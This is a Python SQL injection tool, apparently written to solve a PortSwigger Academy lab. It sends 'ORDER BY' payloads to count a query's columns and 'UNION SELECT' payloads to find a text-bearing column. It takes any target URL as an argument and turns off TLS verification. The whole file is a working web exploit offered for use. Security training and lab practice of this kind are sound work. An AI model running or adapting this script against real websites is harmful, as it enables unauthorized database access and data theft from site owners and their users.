#!/usr/bin/python3
import requests
import sys
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> SQL Injection exploitation tool. note: in this case web need find column name "Jx7YJ6"')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output, string
output = Interface()
output.header()

def exploit_sqli_column_number(url, proxies=None):
    path = "filter?category=Pets"
    for i in range(1,50):
        sql_payload = "'+ORDER+BY+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

def exploit_sqli_string_field(url, num_col, proxies=None):
    path = "filter?category=Pets"
    for i in range(1, num_col+1):
        string = "'LIflf7'"
        payload_list = [' NULL'] * num_col
        payload_list[i-1] = string
        sqli_payload = "' UNION SELECT " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection exploitation tool")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example.com/login)")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()

    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        output.info(f"Using proxy: {args.proxy}")

    output.info("Figuring out number of columns...")
    num_col = exploit_sqli_column_number(args.url.strip(), proxies)
    if num_col:
        output.success("The number of columns is " + str(num_col) + ".")
        output.info("Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(args.url.strip(),num_col, proxies)
        if string_column:
            output.success("The column that contains text is " + str(string_column) + ".")
        else:
            output.error("We were not able to find a column that has a string data type.")
    else:
        output.error("SQLi attack was not successful!")